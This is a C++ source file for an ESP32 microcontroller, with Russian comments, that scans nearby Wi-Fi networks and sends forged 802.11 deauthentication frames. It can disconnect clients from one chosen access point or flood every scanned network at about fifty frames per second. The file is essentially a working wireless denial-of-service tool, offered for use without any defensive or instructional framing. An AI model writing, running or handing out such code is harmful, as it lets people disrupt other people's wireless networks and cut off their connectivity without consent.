// wifi/wifi_atks.cpp
#include "wifi_atks.h"
#include <WiFi.h>
#include <esp_wifi.h>

static WifiTarget targets[20];
static int targetCount = 0;
static bool attackRunning = false;
static int attackType = 0; // 0 = target, 1 = flood
static int targetIndex = 0;
static unsigned long lastFrame = 0;

void wifiAtksSetup() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

int scanWiFiTargets(WifiTarget* out, int maxCount) {
  int n = WiFi.scanNetworks();
  if (n > maxCount) n = maxCount;
  for (int i = 0; i < n; i++) {
    out[i].ssid = WiFi.SSID(i);
    memcpy(out[i].bssid, WiFi.BSSID(i), 6);
    out[i].channel = WiFi.channel(i);
  }
  targetCount = n;
  return n;
}

static void sendDeauthFrame(const uint8_t* bssid, int channel) {
  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src (заполним)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid (заполним)
    0x00, 0x00, 0x07, 0x00
  };
  memcpy(frame + 10, bssid, 6); // src = bssid
  memcpy(frame + 16, bssid, 6); // bssid

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

void wifiStartTargetDeauth(int index) {
  if (index < 0 || index >= targetCount) return;
  targetIndex = index;
  attackType = 0;
  attackRunning = true;
  WiFi.mode(WIFI_STA);
}

void wifiStartDeauthFlood() {
  attackType = 1;
  attackRunning = true;
  WiFi.mode(WIFI_STA);
}

void wifiStopAttack() {
  attackRunning = false;
}

void wifiAttackLoop() {
  if (!attackRunning) return;
  if (millis() - lastFrame < 20) return; // ~50 кадров/сек
  lastFrame = millis();

  if (attackType == 0) {
    sendDeauthFrame(targets[targetIndex].bssid, targets[targetIndex].channel);
  } else {
    for (int i = 0; i < targetCount; i++) {
      sendDeauthFrame(targets[i].bssid, targets[i].channel);
    }
  }
}
